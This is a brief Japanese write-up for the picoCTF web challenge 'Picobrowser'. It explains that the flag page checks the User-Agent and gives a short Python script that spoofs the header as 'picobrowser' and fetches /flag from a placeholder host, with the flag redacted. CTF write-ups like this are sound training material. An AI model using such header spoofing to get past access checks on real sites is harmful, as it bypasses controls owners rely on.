+++
date = '2026-01-05T22:23:28+09:00'
draft = false
title = 'Picobrowser - picoCTF'
summary = "Pico BrowserのWriteupです。"

categories = ["CTF"]
tags = ["picoCTF", "Writeup", "Web", "UserAgent"]
+++

# Picobrowser - picoCTF

## 初期調査
User-Agent が表示されているので User-Agent を `picobrowser` にするだけだと思う。

## Exploit
```py
import requests
from urllib.parse import *
import re

URL = "http://challenge-host"
s = requests.Session()

endpoint = "/flag"
s.headers.update({
  "User-Agent": "picobrowser"
})

req = s.get(urljoin(URL, endpoint))

flag = re.search(r"picoCTF\{[^}]+\}", req.text).group(0)
print(flag)
```

実行:

```bash
$ python3 exploit.py
picoCTF{***}
```